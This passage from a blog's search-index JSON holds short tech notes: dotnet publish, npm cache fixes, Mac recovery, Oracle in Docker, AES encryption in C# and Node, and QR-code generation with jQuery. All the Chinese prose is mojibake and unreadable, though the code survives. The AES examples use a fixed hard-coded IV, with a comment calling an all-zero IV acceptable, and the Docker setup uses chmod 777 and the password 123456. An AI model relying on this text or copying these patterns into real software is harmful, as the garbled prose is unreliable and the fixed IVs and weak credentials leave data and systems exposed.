MyProjectB&#x2F;â”‚ â””â”€â”€ MyProjectB.csprojâ””â”€â”€ MySolution.slnå¦‚æœæƒ³åªå‘å¸ƒ MyProjectA è€Œä¸æ˜¯æ•´ä¸ªè§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥å¯¼èˆªåˆ° MyProjectA çš„ç›®å½•ä¸‹æ‰§è¡Œ dotnet publish å‘½ä»¤ï¼Œæˆ–è€…ä»è§£å†³æ–¹æ¡ˆçš„æ ¹ç›®å½•ç›´æ¥æŒ‡å®šé¡¹ç›®çš„è·¯å¾„ã€‚ä»¥ä¸‹æ˜¯ä¸¤ç§æ–¹æ³•ï¼š æ–¹æ³•ä¸€ï¼šåœ¨é¡¹ç›®ç›®å½•ä¸­æ‰§è¡Œå‘½ä»¤12cd MySolution/MyProjectAdotnet publish -c Release -o ../../publish æ–¹æ³•äºŒï¼šä»è§£å†³æ–¹æ¡ˆæ ¹ç›®å½•æŒ‡å®šé¡¹ç›®è·¯å¾„12cd MySolutiondotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publish æ’é™¤ç‰¹å®šé¡¹ç›®dotnet publish å‘½ä»¤æœ¬èº«æ²¡æœ‰ç›´æ¥æ”¯æŒæ’é™¤ç‰¹å®šé¡¹ç›®çš„é€‰é¡¹ã€‚ä½†æ˜¯ï¼Œå¯ä»¥é€šè¿‡ä»…æŒ‡å®šè¦å‘å¸ƒçš„é¡¹ç›®æ¥é—´æ¥å®ç°è¿™ä¸€ç‚¹ã€‚å¦‚æœéœ€è¦åŒæ—¶å‘å¸ƒå¤šä¸ªé¡¹ç›®ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªé¡¹ç›®å•ç‹¬è¿è¡Œ dotnet publish å‘½ä»¤ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæƒ³å‘å¸ƒ MyProjectA å’Œ MyProjectBï¼Œä½†ä¸å‘å¸ƒå…¶ä»–ä»»ä½•é¡¹ç›®ï¼Œå¯ä»¥è¿™æ ·åšï¼š 12dotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publishdotnet publish ./MyProjectB/MyProjectB.csproj -c Release -o ./publish è¿™æ ·ï¼Œåªæœ‰ MyProjectA å’Œ MyProjectB è¢«å‘å¸ƒåˆ°äº† .&#x2F;publish ç›®å½•ä¸­ï¼Œè€Œå…¶ä»–é¡¹ç›®åˆ™è¢«å¿½ç•¥ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Err idealTree:npm: sill idealTree ","slug":"Err-idealTree-npm-sill-idealTree","date":"2024-09-21T17:18:16.000Z","updated":"2024-09-21T17:20:05.173Z","comments":true,"path":"2024/09/22/Err-idealTree-npm-sill-idealTree/","permalink":"https://banjinmei.github.io/2024/09/22/Err-idealTree-npm-sill-idealTree/","excerpt":"","text":"idealTree:npm: sill idealTree buildDeps Err #æ¸…é™¤ç¼“å­˜ 1npm cache clean --force å‡ºç°npm WARN using â€“force I sure hope you know what you are doing.ç”¨ï¼š 1npm cache verify è®¾ç½®é•œåƒæºï¼š1npm config set registry https://registry.npmmirror.com æŸ¥çœ‹ä¸‹æ˜¯å¦è®¾ç½®æˆåŠŸï¼š1npm config get registry https://registry.npmmirror.com 1npm install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"}],"author":"mu"},{"title":"mac recover","slug":"mac-recoverî›ª","date":"2024-09-20T17:37:04.000Z","updated":"2024-09-20T17:40:15.219Z","comments":true,"path":"2024/09/21/mac-recoverî›ª/","permalink":"https://banjinmei.github.io/2024/09/21/mac-recover%EE%9B%AA/","excerpt":"","text":"mac book æ¢å¤å‡ºå‚è®¾ç½®-å·¦ä¸Šè§’ç³»ç»Ÿåå¥½è®¾ç½®-æŠ¹é™¤æ‰€æœ‰å†…å®¹ reboot1.å…³é—­ç”µè„‘ï¼ŒæŒ‰ä¸‹ç»„åˆé”®(option+command+Ræˆ–command+R)ï¼Œç„¶åæŒ‰ç”µæºé”®å¼€æœºï¼Œç›´åˆ°å‡ºç°è‹¹æœlogoä»¥åŠè¿›åº¦æ¡å³å¯æ¾æ‰‹ï¼Œå¯åŠ¨macOSå®ç”¨å·¥å…·ï¼› 2.å‡ºç°macOSå®ç”¨å·¥å…·å¯¹è¯æ¡†åï¼Œé€‰æ‹©ç£ç›˜å·¥å…·ï¼Œç‚¹å‡»ç»§ç»­æŒ‰é’®ï¼› 3.é€‰æ‹©å·¦ä¾§å†…ç½®ä¸»ç¡¬ç›˜æŠ¹æ‰ï¼Œå¯ä»¥é‡å‘½åä¸ºMacintosh HDï¼› 4.å…³é—­å¯¹è¯æ¡†ï¼Œè¿”å›å®ç”¨å·¥å…·é¡µé¢ï¼Œé€‰æ‹©é‡æ–°å®‰è£…macOS(å¦‚æœå‡ºç°é—®é¢˜ä¸ç”¨æ‹…å¿ƒï¼Œé•¿æŒ‰å…³æœºé”®å¼ºåˆ¶å…³æœºåï¼ŒæŒ‰cmd+Ré‡æ–°è¿›å…¥é€‰æ‹©å®‰è£…å³å¯)ï¼› 5.é‡æ–°å®‰è£…æ—¶ï¼Œå»ºè®®æ£€æŸ¥å³ä¸Šè§’çš„Wi-Fiæ˜¯å¦è¿æ¥ï¼Œä¹‹åæŒ‰ç…§æç¤ºæ“ä½œå³å¯ã€‚ win share fileè®¿è¾¾-&gt;è¿æ¥åˆ°æœåŠ¡å™¨ smb:192.168.X.X http://www.dnpz.net/diannaozhishi/5252.html win macæ–‡ä»¶ä¼ è¾“ å‚è€ƒhttps://support.apple.com/zh-cn/102664 æŠ¹æ‰ Machttps://support.apple.com/zh-cn/102522 command+r -&gt; å®ç”¨å·¥å…· è®¾ç½®å®Œæ•´å®‰å…¨æ€§ MAC CPU1ã€æ‰“å¼€ã€Œè®¿è¾¾ã€&gt;ã€Œåº”ç”¨ç¨‹åºã€&gt;ã€Œå®ç”¨å·¥å…·ã€&gt;ã€Œæ´»åŠ¨ç›‘è§†å™¨ã€ã€‚ 2ã€ç‚¹å‡»ã€ŒCPUã€é€‰é¡¹å¡ï¼Œç„¶åç‚¹å‡»ã€Œ%CPUã€åˆ—ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œæ’åºã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://banjinmei.github.io/tags/mac/"},{"name":"recover","slug":"recover","permalink":"https://banjinmei.github.io/tags/recover/"}],"author":"mu"},{"title":"docker oracle","slug":"docker-oracle","date":"2024-09-20T17:27:39.000Z","updated":"2024-09-20T17:30:27.646Z","comments":true,"path":"2024/09/21/docker-oracle/","permalink":"https://banjinmei.github.io/2024/09/21/docker-oracle/","excerpt":"","text":"ä½¿ç”¨Dockerå®¹å™¨å®‰è£…Oracleæ•°æ®åº“ å®‰è£…Docker12sudo apt-get updatesudo apt-get install docker.io ä¸‹è½½é•œåƒ1docker pull registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c åˆ›å»ºæ–‡ä»¶1mkdir -p /home/data/oracle/oradata æˆæƒï¼Œä¸æˆæƒä¼šå¯¼è‡´åé¢å®‰è£…å¤±è´¥123456789101112chmod 777 /home/data/oracle/oradatadocker run -d -p 1521:1521 -p 5500:5500 -e ORACLE_SID=ORCLCDB -e ORACLE_PDB=ORCLPDB -e ORACLE_PWD=123456 -e ORACLE_EDITION=standard -e ORACLE_CHARACTERSET=AL32UTF8 -v /home/data/oracle/oradata:/opt/oracle/oradata --name oracle registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c è¿›å…¥ 1docker exec -it oracle-db bash -c &quot;source /home/oracle/.bashrc; sqlplus /nolog&quot; 12345SQL&gt; CONNECT sys as sysdba@your_passwordSQL&gt; ALTER USER sys IDENTIFIED BY your_password;SQL&gt; CREATE USER your_username IDENTIFIED BY your_password;SQL&gt; GRANT CONNECT, RESOURCE TO your_username; 12345678910CREATE TABLE test_table ( id NUMBER, name VARCHAR2(50));INSERT INTO test_table (id, name) VALUES (1, &#x27;Test Name&#x27;);COMMIT;SELECT * FROM test_table; 12CONNECT / AS SYSDBA; ä»¥ SYSDBA è§’è‰²è¿æ¥åˆ°æ•°æ®åº“ã€‚ ä½¿ç”¨ SYSDBA è§’è‰²ç™»å½•ï¼Œè¯¥è§’è‰²å…·æœ‰æœ€é«˜çº§åˆ«çš„æ•°æ®åº“æƒé™ï¼Œå…è®¸è¿›è¡Œç³»ç»Ÿçº§åˆ«çš„ç®¡ç†ä»»åŠ¡ã€‚ 1alter user system identified by å¯†ç ;ä¿®æ”¹ç³»ç»Ÿç”¨æˆ·ï¼ˆsystemï¼‰çš„ç™»å½•å¯†ç ã€‚ 1CREATE USER hhhhh IDENTIFIED BY å¯†ç ; åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ· hhhhhï¼Œå¹¶æŒ‡å®šå…¶ç™»å½•å¯†ç ã€‚ 1GRANT CREATE SESSION TO hhhhh; å…è®¸ç”¨æˆ· hhhhhè¿æ¥åˆ°æ•°æ®åº“ã€‚ 1GRANT CREATE TABLE TO hhhhh; å…è®¸ç”¨æˆ· hhhhhåœ¨æ•°æ®åº“ä¸­åˆ›å»ºæ–°çš„è¡¨ã€‚ 1ALTER USER hhhhh QUOTA UNLIMITED ON USERS; è®¾ç½®ç”¨æˆ· hhhhh åœ¨è¡¨ç©ºé—´ USERS ä¸Šçš„å­˜å‚¨é…é¢ä¸ºæ— é™åˆ¶ï¼Œå…è®¸ç”¨æˆ·å­˜å‚¨æ•°æ®","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"roacle","slug":"roacle","permalink":"https://banjinmei.github.io/tags/roacle/"}],"author":"mu"},{"title":"node ase encrypt","slug":"node-ase-encrypt","date":"2024-09-20T17:25:07.000Z","updated":"2024-09-20T17:26:46.952Z","comments":true,"path":"2024/09/21/node-ase-encrypt/","permalink":"https://banjinmei.github.io/2024/09/21/node-ase-encrypt/","excerpt":"","text":"1234567891011121314151617181920212223// åŠ å¯†æ–¹æ³•public static string Encrypt(string plainText, string key)&#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6];// new byte[16]; // åˆå§‹åŒ–å‘é‡ (IV) å¯ä»¥è®¾ä¸ºå…¨é›¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨éšæœºå€¼ ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) &#123; using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) &#123; swEncrypt.Write(plainText); &#125; return Convert.ToBase64String(msEncrypt.ToArray()); &#125; &#125;&#125; 12345678910111213141516// åŠ å¯†æ–¹æ³•function encrypt(plainText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); // ä¸C#ä¸­ç›¸åŒçš„IV const cipher = crypto.createCipheriv(&#x27;aes-256-cbc&#x27;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, &#x27;utf8&#x27;, &#x27;base64&#x27;); encrypted += cipher.final(&#x27;base64&#x27;); return encrypted;&#125;// å¡«å……æˆ–æˆªæ–­å¯†é’¥ä¸º32å­—èŠ‚function padKey(key) &#123; return crypto.createHash(&#x27;sha256&#x27;).update(key).digest(); // ä½¿ç”¨ SHA-256 å°†å¯†é’¥å¤„ç†æˆ 32 å­—èŠ‚&#125; AES-256-CBC ç®—æ³•ï¼Œå¯†é’¥å¿…é¡»æ˜¯ 32 å­—èŠ‚é•¿ã€‚ å¯æ”¹ä¸º AES-192AES-192-CBC åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•å…è®¸ä½¿ç”¨ 24 å­—èŠ‚çš„å¯†é’¥ã€‚ 12345678910111213141516171819202122232425262728293031323334const crypto = require(&#x27;crypto&#x27;);// åŠ å¯†æ–¹æ³•function encrypt(plainText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const cipher = crypto.createCipheriv(&#x27;aes-192-cbc&#x27;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, &#x27;utf8&#x27;, &#x27;base64&#x27;); encrypted += cipher.final(&#x27;base64&#x27;); return encrypted;&#125;// è§£å¯†æ–¹æ³•function decrypt(cipherText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const decipher = crypto.createDecipheriv(&#x27;aes-192-cbc&#x27;, Buffer.from(key), iv); let decrypted = decipher.update(cipherText, &#x27;base64&#x27;, &#x27;utf8&#x27;); decrypted += decipher.final(&#x27;utf8&#x27;); return decrypted;&#125;// æµ‹è¯•ä¾‹å­const key = &#x27;thisisaverysecretkey12xx&#x27;; // 24å­—èŠ‚çš„keyï¼ˆAES-192ï¼‰const textToEncrypt = &#x27;88&#x27;;// åŠ å¯†const encryptedText = encrypt(textToEncrypt, key);console.log(&#x27;åŠ å¯†åçš„æ–‡æœ¬:&#x27;, encryptedText);// è§£å¯†const decryptedText = decrypt(encryptedText, key);console.log(&#x27;è§£å¯†åçš„æ–‡æœ¬:&#x27;, decryptedText);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"ase","slug":"ase","permalink":"https://banjinmei.github.io/tags/ase/"}],"author":"mu"},{"title":"js qrcode","slug":"js-qrcode","date":"2024-09-20T17:18:43.000Z","updated":"2024-12-10T12:52:02.214Z","comments":true,"path":"2024/09/21/js-qrcode/","permalink":"https://banjinmei.github.io/2024/09/21/js-qrcode/","excerpt":"","text":"qrcode12345678910111213141516&lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt;&lt;script&gt; $(document).ready(function () &#123; var qrData = &quot;https://www.qq.com?p=100&quot;; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, height: 200, text: qrData &#125;); &#125;);&lt;/script&gt; Node Server123456789101112131415161718192021222324252627282930313233const http = require(&#x27;http&#x27;);const fs = require(&#x27;fs&#x27;);const path = require(&#x27;path&#x27;);const server = http.createServer((req, res) =&gt; &#123; if (req.url === &#x27;/&#x27;) &#123; req.url = &#x27;/index.html&#x27;; &#125; const filePath = path.join(__dirname, &#x27;public&#x27;, req.url); fs.readFile(filePath, (err, content) =&gt; &#123; if (err) &#123; // è¯»å–è‡ªå®šä¹‰çš„404é¡µé¢ fs.readFile(path.join(__dirname, &#x27;public&#x27;, &#x27;404.html&#x27;), (err, content) =&gt; &#123; if (err) &#123; res.writeHead(500, &#123; &#x27;Content-Type&#x27;: &#x27;text/plain&#x27; &#125;); res.end(&#x27;500 Internal Server Error&#x27;); &#125; else &#123; res.writeHead(404, &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;); res.end(content); &#125; &#125;); &#125; else &#123; res.writeHead(200, &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;); res.end(content); &#125; &#125;);&#125;);server.listen(process.env.PORT || 3919, &#x27;localhost&#x27;, () =&gt; &#123; console.log(`server listen at: $&#123;process.env.PORT || 3919&#125;`);&#125;); &#x2F;public&#x2F;index.html 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Generate QR Code&lt;/title&gt; &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt; &lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt; &lt;script&gt; $(document).ready(function () &#123; var qrData = &quot;https://www.qq.com?p=100&quot;; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, height: 200, text: qrData &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; è‡ªå®šä¹‰123&lt;input type=&quot;text&quot; id=&quot;qrInput&quot; placeholder=&quot;data...&quot;&gt; &lt;button id=&quot;generateQR&quot;&gt;Generate&lt;/button&gt; &lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt; 1234567891011121314$(&#x27;#generateQR&#x27;).click(function () &#123; $(&quot;#qrcode&quot;).empty(); // æ¸…ç©ºä¹‹å‰çš„äºŒç»´ç  var qrData = $(&#x27;#qrInput&#x27;).val(); // è·å–è¾“å…¥æ¡†ä¸­çš„å€¼ if (qrData) &#123; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, // è®¾ç½®å®½åº¦ height: 200, // è®¾ç½®é«˜åº¦ text: qrData // è®¾ç½®äºŒç»´ç çš„å†…å®¹ &#125;); &#125; else &#123; alert(&#x27;è¯·è¾“å…¥è¦ç”Ÿæˆçš„äºŒç»´ç å†…å®¹&#x27;); &#125; &#125;); url æ·»åŠ äºŒç»´ç 12345678910111213141516171819202122&lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data-src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; onerror=&quot;javascript:this.src=&#x27;assets\\/images\\/logos\\/default.webp&#x27;&quot; alt=&quot;è¯­é›€&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;è¯­é›€&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;ç›´è¾¾&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; æ·»åŠ ä¸ªæŒ‰é’®ï¼Œç§»åŠ¨ä¸Šå»åˆ™ ä¸º data-url&#x3D;â€â€ ç”ŸæˆäºŒç»´ç  å¹¶å±•ç¤ºï¼Œç§»å‡ºåˆ™æ¶ˆå¤±ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ HTMLã€JavaScript å’Œä¸€ä¸ªå¸¸ç”¨çš„äºŒç»´ç ç”Ÿæˆåº“ï¼ˆè¿™é‡Œä»¥qrcodejs2ä¸ºä¾‹ï¼Œéœ€è¦å¼•å…¥å…¶ç›¸å…³çš„åº“æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ CDN å¼•å…¥ ï¼‰æ¥å®ç°éœ€æ±‚çš„ä»£ç ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;è¯­é›€äºŒç»´ç ç”Ÿæˆç¤ºä¾‹&lt;/title&gt; &lt;!-- å¼•å…¥äºŒç»´ç ç”Ÿæˆåº“ï¼ˆè¿™é‡Œä»¥qrcodejs2ä¸ºä¾‹ï¼Œå®é™…ä½¿ç”¨æ—¶ç¡®ä¿èƒ½æ­£ç¡®å¼•å…¥è¯¥åº“æ–‡ä»¶ï¼‰ --&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js&quot;&gt;&lt;/script&gt; &lt;style&gt; /* ç®€å•æ ·å¼ï¼Œç”¨äºå±•ç¤ºäºŒç»´ç çš„å®¹å™¨ */ .qrcode-container &#123; display: none; position: absolute; border: 1px solid #ccc; padding: 10px; background-color: white; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data-src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; onerror=&quot;javascript:this.src=&#x27;assets\\/images\\/logos\\/default.webp&#x27;&quot; alt=&quot;è¯­é›€&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;è¯­é›€&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;ç›´è¾¾&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;!-- æ·»åŠ æŒ‰é’® --&gt; &lt;button id=&quot;generate-qr-btn&quot;&gt;ç”Ÿæˆè¯­é›€äºŒç»´ç &lt;/button&gt; &lt;!-- ç”¨äºå±•ç¤ºäºŒç»´ç çš„å®¹å™¨ --&gt; &lt;div id=&quot;qrcode-container&quot; class=&quot;qrcode-container&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript éƒ¨åˆ† 123456789101112131415161718window.onload = function () &#123; const generateBtn = document.getElementById(&#x27;generate-qr-btn&#x27;); const qrCodeContainer = document.getElementById(&#x27;qrcode-container&#x27;); const targetLink = document.querySelector(&#x27;a[href=&quot;https://www.yuque.com/&quot;]&#x27;).dataset.url; generateBtn.addEventListener(&#x27;mouseover&#x27;, function () &#123; const qrcode = new QRCode(qrCodeContainer, &#123; text: targetLink, width: 128, height: 128 &#125;); qrCodeContainer.style.display = &#x27;block&#x27;; &#125;); generateBtn.addEventListener(&#x27;mouseout&#x27;, function () &#123; qrCodeContainer.style.display = &#x27;none&#x27;; &#125;);&#125;; ä¸Šè¿°ä»£ç çš„å®ç°æ­¥éª¤å¦‚ä¸‹ï¼šHTML ç»“æ„è°ƒæ•´ï¼šåœ¨åŸæœ‰çš„ HTML ç»“æ„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†ä¸€ä¸ªæŒ‰é’®å…ƒç´ ï¼Œå…¶idä¸ºgenerate-qr-btnï¼Œç”¨äºè§¦å‘äºŒç»´ç ç”Ÿæˆçš„äº¤äº’æ“ä½œã€‚åŒæ—¶æ·»åŠ äº†ä¸€ä¸ªdivå…ƒç´ ä½œä¸ºäºŒç»´ç å±•ç¤ºçš„å®¹å™¨ï¼Œå…¶idä¸ºqrcode-containerï¼Œå¹¶é€šè¿‡ CSS è®¾ç½®åˆå§‹çŠ¶æ€ä¸ºä¸æ˜¾ç¤ºï¼ˆdisplay: noneï¼‰ã€‚JavaScript é€»è¾‘ï¼šé¡µé¢åŠ è½½å®Œæˆåï¼ˆé€šè¿‡window.onloadäº‹ä»¶ï¼‰ï¼Œè·å–æŒ‰é’®å…ƒç´ å’ŒäºŒç»´ç å®¹å™¨å…ƒç´ ä»¥åŠç›®æ ‡é“¾æ¥ï¼ˆä»å¯¹åº”aæ ‡ç­¾çš„data-urlå±æ€§è·å–ï¼‰ã€‚ç»™æŒ‰é’®æ·»åŠ mouseoverï¼ˆé¼ æ ‡ç§»å…¥ï¼‰äº‹ä»¶ç›‘å¬å™¨ï¼Œåœ¨äº‹ä»¶å¤„ç†å‡½æ•°ä¸­ï¼Œä½¿ç”¨qrcodejs2åº“åˆ›å»ºä¸€ä¸ªäºŒç»´ç å®ä¾‹ï¼Œå¹¶å°†ç›®æ ‡é“¾æ¥ä½œä¸ºè¦ç¼–ç çš„å†…å®¹ä¼ å…¥ï¼Œè®¾ç½®å¥½åˆé€‚çš„å®½åº¦å’Œé«˜åº¦ï¼ˆè¿™é‡Œç¤ºä¾‹ä¸º 128pxï¼‰ï¼ŒåŒæ—¶å°†äºŒç»´ç å®¹å™¨çš„displayå±æ€§è®¾ç½®ä¸ºblockä½¿å…¶æ˜¾ç¤ºå‡ºæ¥ã€‚ data-target-url&#x3D;1234567891011121314151617181920212223242526272829303132333435&lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data- src=&quot;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp&quot; alt=&quot;è¯­é›€&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;è¯­é›€&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;ä¸“ä¸šçš„äº‘ç«¯çŸ¥è¯†åº“ã€‚&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;!-- æ·»åŠ æŒ‰é’®ï¼Œå¹¶æ·»åŠ è‡ªå®šä¹‰å±æ€§data-target-urlæ¥æŒ‡å®šè¦ç”ŸæˆäºŒç»´ç çš„ç›®æ ‡é“¾æ¥ --&gt; &lt;button id=&quot;generate-qr-btn&quot; data-target-url=&quot;https://www.yuque.com/&quot;&gt;ç”Ÿæˆè¯­é›€äºŒç»´ç &lt;/button&gt; &lt;!-- 